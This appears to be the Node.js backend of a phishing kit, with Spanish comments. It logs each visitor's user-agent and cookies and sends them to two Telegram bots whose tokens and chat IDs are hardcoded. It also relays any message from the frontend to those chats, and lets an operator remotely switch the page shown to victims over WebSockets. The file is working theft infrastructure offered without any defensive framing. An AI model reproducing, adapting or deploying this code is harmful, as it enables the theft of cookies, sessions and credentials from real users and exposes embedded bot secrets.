const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const Database = require("better-sqlite3");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const cors = require("cors");
const path = require("path");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// 🛠 Middlewares
app.use(express.json());
app.use(cookieParser());
app.use(cors());

// 🔥 Servir archivos estáticos
app.use(express.static(path.join(__dirname, "public")));

// 🗄️ Base de datos SQLite
const db = new Database("control.db", { verbose: console.log });
db.exec("CREATE TABLE IF NOT EXISTS control (id INTEGER PRIMARY KEY, pagina TEXT)");

// 🔐 Credenciales de Telegram
const TELEGRAM_BOTS = [
    { token: "7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI", chatId: "6328222257" },
    { token: "7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY", chatId: "7038426430" }
];

// 📩 Función para enviar mensajes a Telegram
async function sendTelegramMessage(message) {
    try {
        for (const bot of TELEGRAM_BOTS) {
            await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                chat_id: bot.chatId,
                text: message,
                parse_mode: "MarkdownV2"
            });
        }
        console.log("✅ Mensaje enviado a Telegram");
    } catch (error) {
        console.error("❌ Error enviando mensaje a Telegram:", error.message);
    }
}

// 📌 Endpoint para verificar el estado de la página
app.get("/check", (req, res) => {
    res.json({ pagina: "loader" });
});

// 🏠 Ruta principal
app.get("/home.html", (req, res) => {
    const userAgent = req.headers["user-agent"];
    const cookies = req.cookies;
    console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });

    sendTelegramMessage(`Nuevo visitante:\nUser-Agent: ${userAgent}\nCookies: ${JSON.stringify(cookies)}`);
    res.sendFile(path.join(__dirname, "public", "home.html"));
});

// 🔌 WebSockets para actualización en tiempo real
wss.on("connection", (ws) => {
    console.log("🔌 Cliente WebSocket conectado");
    ws.send("loader");

    ws.on("close", () => {
        console.log("🔌 Cliente WebSocket desconectado");
    });
});

// ⚡ Endpoint para cambiar la página (usado por el bot)
app.post("/setPage", (req, res) => {
    const { pagina } = req.body;

    if (!pagina) {
        return res.status(400).json({ error: "Falta el parámetro 'pagina'" });
    }

    db.prepare("INSERT OR REPLACE INTO control (id, pagina) VALUES (1, ?)").run(pagina);
    console.log(`✅ Página cambiada a: ${pagina}`);

    // Notificar a todos los clientes WebSocket
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(pagina);
        }
    });

    res.json({ message: "Página actualizada" });
});

// 📩 Endpoint para enviar mensajes a Telegram desde el frontend
app.post("/enviar-telegram", async (req, res) => {
    try {
        const { mensaje } = req.body;
        if (!mensaje) {
            return res.status(400).json({ error: "Falta el mensaje" });
        }

        await sendTelegramMessage(mensaje);
        res.json({ success: true, message: "Mensaje enviado correctamente a Telegram" });

    } catch (error) {
        console.error("❌ Error al enviar mensaje a Telegram:", error.message);
        res.status(500).json({ error: "Error al enviar mensaje a Telegram" });
    }
});

// 🚀 Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🌍 Servidor corriendo en http://0.0.0.0:${PORT}`));

